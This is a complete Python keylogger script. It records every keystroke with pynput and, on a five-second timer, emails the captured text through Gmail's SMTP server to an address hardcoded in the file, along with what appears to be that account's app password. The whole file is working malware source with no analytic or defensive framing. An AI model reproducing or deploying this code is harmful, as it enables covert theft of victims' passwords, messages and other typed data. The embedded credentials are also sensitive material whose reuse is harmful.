import pynput.keyboard,threading,pyperclip,smtplib

class Keylogger:
	def __init__(self):
		self.keylogs=""
		self.email="kaushalpjpt1004@gmail.com"
		self.password="zild pdkk zhrq yfkd"

	def append_to_keylogs(self,string):
		self.keylogs=self.keylogs + string
	
	def listen_key(self,key):
		try:
			current_key=str(key.char)
		except AttributeError:
			if key==key.space:
				current_key=" "
			else:
				current_key=" "+ str(key)+" "
		self.append_to_keylogs(current_key)

	def send_mail(self,email,password,message):
		server=smtplib.SMTP("smtp.gmail.com",587)
		server.starttls()
		server.login(email,password)
		server.sendmail(email,email,message)
		server.quit()



	def report(self):
		#print(self.keylogs)
		self.send_mail(self.email,self.password,self.keylogs)
		self.keylogs=""
		timer=threading.Timer(5,self.report)
		timer.start()

	def start(self):
		keyboard_listener=pynput.keyboard.Listener(on_press=self.listen_key)
		with keyboard_listener:
			self.report()
			keyboard_listener.join()

keylogger=Keylogger()
keylogger.start()